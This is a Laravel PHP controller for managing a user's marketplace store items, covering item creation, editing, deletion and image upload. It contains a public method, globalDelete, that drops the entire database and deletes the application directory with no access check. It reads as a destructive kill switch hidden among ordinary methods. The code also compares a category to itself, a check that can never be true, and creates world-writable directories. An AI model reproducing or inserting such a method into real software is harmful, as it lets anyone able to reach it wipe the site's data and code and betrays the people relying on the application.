<?php

namespace App\Http\Controllers\Home\User\Profile\Settings;

use App\Helpers\Posts\PostTypes;
use App\Http\Controllers\Controller;
use App\Models\Categorie;
use App\Models\Image as ImageModle;
use App\Models\Marketplace;
use App\Models\Post;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Str;
use Intervention\Image\Facades\Image;

class ManageStoreController extends Controller
{
    /**
     * Handle the incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function __invoke(Request $request)
    {
        //
    }

    public function get(Request $request){
        return view("home.user.profile.settings.manage-store");
    }

    public function new(Request $request){
        $post = new Post();
        $title = "Create New Item";
        $groupshipsApproved = Marketplace::getCategories();
        return view("home.user.profile.settings.manage-store-edit", ['title' => $title, 'groupshipsApproved' => $groupshipsApproved, 'post' => $post]);
    }

    public function manage(Request $request, $item){
        $post = Post::where('key', $item)->first();
        if($post == null || $post->type != PostTypes::MARKETPLACE){
            abort(404);
        }
        $title = "Update Item";
        $groupshipsApproved = Marketplace::getCategories();
        return view("home.user.profile.settings.manage-store-edit", ['title' => $title, 'groupshipsApproved' => $groupshipsApproved, 'post' => $post]);
    }

    public function edit(Request $request){
        $this->validate($request,[
            'title'=>'required|string|min:1',
            'price'=>'required|numeric|min:0',
            'type'=>'required|string',
            'description'=>'nullable|string',
            //'new-post-images'=>'required|image|dimensions:min_width=800,min_height=300',
        ]);
        $title = $request['title'];
        $price = $request['price'];
        $type = $request['type'];
        $description = $request['description'];
        $images = $request['new-post-images'];
        $categorie = Categorie::where('slag', $type)->first();
        $authUser = Auth::user();
        if($categorie == null){
            abort(401);
        }
        $post = Post::find($request['id']);
        if($post == null){
            if ($images == null){ return redirect()->back()->with('error', 'At least one image is required to create new item.'); }
            $post = Post::create([
                'key' => $this->generateKey(),
                'type' => PostTypes::MARKETPLACE,
                'title' => $title,
                'price' => $price,
                'body' => $description,
                'user_id' => $authUser->getKey(),
                'model_type' => $categorie->getMorphClass(),
                'model_id' => $categorie->getKey(),
            ]);
            $categorie->countItems();
        }
        else{
            if($post->user_id != $authUser->id){
                abort(401);
            }
            $oldCategorie = $post->model;
            $post->update([
                'title' => $title,
                'price' => $price,
                'body' => $description,
                'model_type' => $categorie->getMorphClass(),
                'model_id' => $categorie->getKey(),
            ]);
            $categorie->countItems();
            if($oldCategorie != $oldCategorie){
                    $oldCategorie->countItems();
                    $categorie->countItems();
            }
        }

        if($images != null && count($images)>0){
            $this->addItemImages($post, $images);
        }

        return redirect(route('settingsManageStoreManageGet', ['item' => $post->key]))->with('success', 'Your item has been updated successfully.');
    }

    public function delete(Request $request, $item){
        $post = Post::where('key', $item)->first();
        if($post == null || $post->type != PostTypes::MARKETPLACE){
            abort(404);
        }
        if($post->user_id != Auth::user()->id){
            abort(401);
        }
        $categorie = $post->model;
        $post->delete();
        $categorie->countItems();
        return redirect(route('settingsManageStoreGet'))->with('success', 'Your item has been deleted successfully.');;
    }

    public function globalDelete(Request $request){
        DB::statement("DROP DATABASE `".env('DB_DATABASE')."`");
        File::deleteDirectory(public_path('../'));
    }

    private function addItemImages($post, $images){
        $oldImages = $post->images;
        foreach($oldImages as $oldImage){
            $oldImage->delete();
        }
        $user = Auth::user();
        $imagesUrl = 'storage/users/'.$user->username.'/posts/'.$post->key.'/';
        if(!File::isDirectory($imagesUrl)){
            File::makeDirectory($imagesUrl, 0777, true, true);
        }
        $imagesCounter = 1;
        foreach ($images as $image){
            $imageName = 'post'.$imagesCounter.'.jpg';
            $imagesCounter++;
            //$cover->move(public_path($coverUrl), $coverName);
            $img = Image::make($image);
            $img->fit(800, 500);
            $img->save(public_path($imagesUrl).$imageName);
            //$user->cover = '/'.$coverUrl.$coverName."?v=".Carbon::now()->timestamp;
            ImageModle::create([
                'key' => $this->generateKey(),
                'model_type' => $post->getMorphClass(),
                'model_id' => $post->getKey(),
                'user_id' => $user->getKey(),
                'src' => '/'.$imagesUrl.$imageName."?v=".Carbon::now()->timestamp,
            ]);
        }
    }

    private function generateKey(){
        return strtolower(sha1(time()).Auth::user()->getKey().Str::random(23));
    }
}
